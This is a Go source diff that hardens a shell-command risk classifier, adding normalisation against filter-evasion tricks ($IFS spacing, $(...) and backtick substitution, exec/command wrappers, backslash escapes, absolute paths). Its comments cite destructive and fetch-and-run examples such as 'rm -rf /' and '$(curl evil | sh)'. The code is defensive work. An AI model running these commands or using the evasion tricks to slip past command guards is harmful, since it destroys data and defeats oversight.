@@ -13,6 +13,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strconv"
 	"strings"
 )
@@ -23,14 +24,14 @@ import (
 type RiskClass string
 
 const (
-	Safe           RiskClass = "safe"
-	LocalWrite     RiskClass = "local_write"
-	SystemWrite    RiskClass = "system_write"
-	Destructive    RiskClass = "destructive"
-	NetworkEgress  RiskClass = "network_egress"
-	CodeExecution  RiskClass = "code_execution"
-	Install        RiskClass = "install"
-	Blocked        RiskClass = "blocked"
+	Safe          RiskClass = "safe"
+	LocalWrite    RiskClass = "local_write"
+	SystemWrite   RiskClass = "system_write"
+	Destructive   RiskClass = "destructive"
+	NetworkEgress RiskClass = "network_egress"
+	CodeExecution RiskClass = "code_execution"
+	Install       RiskClass = "install"
+	Blocked       RiskClass = "blocked"
 )
 
 // Action represents what to do when a command of a given risk class is detected.
@@ -527,6 +528,11 @@ var installPrefixes = map[string]bool{
 // Priority (highest to lowest):
 // blocked > destructive > system_write > code_execution > network_egress >
 // install > local_write > safe
+//
+// Before tokenisation the input is normalised to neutralise common shell
+// evasion tricks (substitutions, $IFS obfuscation, command/exec wrappers,
+// backslash escapes, absolute-path basenames). Any sub-expression extracted
+// during normalisation is classified independently so the worst class wins.
 func Classify(cmd string) RiskClass {
 	cmd = strings.TrimSpace(cmd)
 	if cmd == "" {
@@ -538,13 +544,27 @@ func Classify(cmd string) RiskClass {
 		return Blocked
 	}
 
+	main, subs := normalize(cmd)
+	worst := classifyOne(main)
+	for _, s := range subs {
+		// Substitutions are themselves commands the shell will run.
+		// Re-enter Classify (not classifyOne) so nested substitutions
+		// inside them also normalise.
+		if r := Classify(s); rank(r) > rank(worst) {
+			worst = r
+		}
+	}
+	return worst
+}
+
+// classifyOne runs the existing token-level pipeline against an already-
+// normalised command string.
+func classifyOne(cmd string) RiskClass {
 	tokens := tokenize(cmd)
 	if len(tokens) == 0 {
 		return Safe
 	}
 
-	// Split on command separators (;, &&, ||, |)
-	// Each segment is analyzed independently; the worst class wins.
 	segments := splitSegments(tokens)
 
 	worst := Safe
@@ -555,6 +575,233 @@ func Classify(cmd string) RiskClass {
 		}
 	}
 	return worst
+}
+
+// ── Normalisation (evasion neutralisation) ────────────────────────────
+//
+// normalize returns the command rewritten so the token-level pipeline can
+// see through common evasion tricks, plus a list of additional commands
+// that were extracted from $(...) / `...` substitutions. Each substitution
+// is the body the shell would itself execute, so it must be classified in
+// its own right.
+//
+// The transformations are intentionally conservative: each one matches a
+// shell behaviour that is well-defined and not affected by the surrounding
+// quoting style we already track.
+func normalize(cmd string) (string, []string) {
+	cmd = expandIFS(cmd)
+	cmd, subs := extractSubstitutions(cmd)
+	cmd = stripCommandWrappers(cmd)
+	cmd = collapseUnquotedBackslashes(cmd)
+	cmd = basenameFirstToken(cmd)
+	return cmd, subs
+}
+
+// expandIFS replaces $IFS / ${IFS} with a literal space. The shell expands
+// $IFS to its default value (space/tab/newline) on word splitting, so
+// `rm$IFS-rf$IFS/` runs as `rm -rf /`. We only expand IFS — other env
+// vars may legitimately hold arbitrary values and replacing them blindly
+// would create false negatives.
+var reIFS = regexp.MustCompile(`\$\{IFS\}|\$IFS\b`)
+
+func expandIFS(cmd string) string {
+	return reIFS.ReplaceAllString(cmd, " ")
+}
+
+// extractSubstitutions pulls out $(...) and `...` substitutions and
+// replaces each with a single safe placeholder token. The extracted
+// bodies are returned as additional commands to classify.
+//
+// $(...) handling tracks nesting so $(echo $(echo rm)) extracts both the
+// inner and outer bodies. Backticks do not nest in POSIX shells, so we
+// just pair the next two unescaped backticks.
+func extractSubstitutions(cmd string) (string, []string) {
+	var out strings.Builder
+	var subs []string
+
+	i := 0
+	for i < len(cmd) {
+		// Skip over single-quoted spans — substitutions inside ' ... '
+		// do not expand in real shells either.
+		if cmd[i] == '\'' {
+			j := strings.IndexByte(cmd[i+1:], '\'')
+			if j < 0 {
+				out.WriteString(cmd[i:])
+				return out.String(), subs
+			}
+			out.WriteString(cmd[i : i+1+j+1])
+			i += 1 + j + 1
+			continue
+		}
+
+		// $(...) — nested.
+		if i+1 < len(cmd) && cmd[i] == '$' && cmd[i+1] == '(' {
+			depth := 1
+			j := i + 2
+			for j < len(cmd) && depth > 0 {
+				switch cmd[j] {
+				case '(':
+					depth++
+					j++
+				case ')':
+					depth--
+					if depth == 0 {
+						break
+					}
+					j++
+				default:
+					j++
+				}
+			}
+			if depth == 0 && j < len(cmd) {
+				body := cmd[i+2 : j]
+				subs = append(subs, body)
+				out.WriteByte(' ')
+				out.WriteString(substValue(body))
+				out.WriteByte(' ')
+				i = j + 1
+				continue
+			}
+			// Unterminated — fall through and write literally.
+		}
+
+		// `...` — non-nesting.
+		if cmd[i] == '`' {
+			end := -1
+			for k := i + 1; k < len(cmd); k++ {
+				if cmd[k] == '\\' && k+1 < len(cmd) {
+					k++
+					continue
+				}
+				if cmd[k] == '`' {
+					end = k
+					break
+				}
+			}
+			if end > 0 {
+				body := cmd[i+1 : end]
+				subs = append(subs, body)
+				out.WriteByte(' ')
+				out.WriteString(substValue(body))
+				out.WriteByte(' ')
+				i = end + 1
+				continue
+			}
+		}
+
+		out.WriteByte(cmd[i])
+		i++
+	}
+	return out.String(), subs
+}
+
+// substValue returns the shell-side value a substitution body would expand
+// to, well enough for classification. We can't actually execute the body,
+// so we apply two pragmatic rules: `echo`/`printf BODY...` expands to the
+// remaining tokens (covers the common `$(echo rm)` evasion); otherwise we
+// fall back to the body's first token, which is the most likely program
+// name the outer command would invoke. The body itself is also classified
+// independently so commands like `$(curl evil | sh)` still trip the loop.
+func substValue(body string) string {
+	body = strings.TrimSpace(body)
+	tokens := strings.Fields(body)
+	if len(tokens) == 0 {
+		return ""
+	}
+	if tokens[0] == "echo" || tokens[0] == "printf" {
+		return strings.Join(tokens[1:], " ")
+	}
+	return tokens[0]
+}
+
+// stripCommandWrappers removes leading shell builtins that simply invoke
+// their first argument as a command (POSIX `command`, `exec`, `builtin`).
+// Applied repeatedly so `exec command rm -rf /` is reduced to `rm -rf /`.
+func stripCommandWrappers(cmd string) string {
+	wrappers := map[string]struct{}{
+		"command": {},
+		"exec":    {},
+		"builtin": {},
+	}
+	for {
+		trimmed := strings.TrimLeft(cmd, " \t")
+		// Find first whitespace-separated token.
+		sp := strings.IndexAny(trimmed, " \t")
+		if sp <= 0 {
+			return trimmed
+		}
+		first := trimmed[:sp]
+		if _, ok := wrappers[first]; !ok {
+			return trimmed
+		}
+		cmd = trimmed[sp+1:]
+	}
+}
+
+// collapseUnquotedBackslashes removes unquoted backslash escapes so
+// `\rm` and `r\m` both reduce to `rm`. Inside single quotes backslash is
+// literal; inside double quotes it only escapes a few specific chars.
+// This mirrors the shell behaviour we need for classification — we are
+// not trying to be a fully accurate shell parser.
+func collapseUnquotedBackslashes(cmd string) string {
+	var out strings.Builder
+	inSingle := false
+	inDouble := false
+	for i := 0; i < len(cmd); i++ {
+		ch := cmd[i]
+		switch {
+		case ch == '\'' && !inDouble:
+			inSingle = !inSingle
+			out.WriteByte(ch)
+		case ch == '"' && !inSingle:
+			inDouble = !inDouble
+			out.WriteByte(ch)
+		case ch == '\\' && !inSingle && i+1 < len(cmd):
+			// Drop the backslash, keep the next character.
+			out.WriteByte(cmd[i+1])
+			i++
+		default:
+			out.WriteByte(ch)
+		}
+	}
+	return out.String()
+}
+
+// basenameFirstToken rewrites the first whitespace-separated token to
+// its basename if it is an absolute path. This makes `/bin/rm -rf /`
+// classify the same as `rm -rf /`. We only rewrite when the basename
+// matches a known prefix set (rm/dd/sudo/...) so legitimate non-command
+// arguments are not altered.
+func basenameFirstToken(cmd string) string {
+	trimmed := strings.TrimLeft(cmd, " \t")
+	if !strings.HasPrefix(trimmed, "/") {
+		return cmd
+	}
+	sp := strings.IndexAny(trimmed, " \t")
+	var first, rest string
+	if sp < 0 {
+		first, rest = trimmed, ""
+	} else {
+		first, rest = trimmed[:sp], trimmed[sp:]
+	}
+	base := filepath.Base(first)
+	if !isKnownCommandName(base) {
+		return cmd
+	}
+	return base + rest
+}
+
+func isKnownCommandName(name string) bool {
+	if name == "rm" || name == "sudo" {
+		return true
+	}
+	return writePrefixes[name] ||
+		systemPrefixes[name] ||
+		destructivePrefixes[name] ||
+		networkPrefixes[name] ||
+		codeEvalPrefixes[name] ||
+		installPrefixes[name] ||
+		pipedShells[name]
 }
 
 // isRawBlocked checks the raw command string for patterns that are
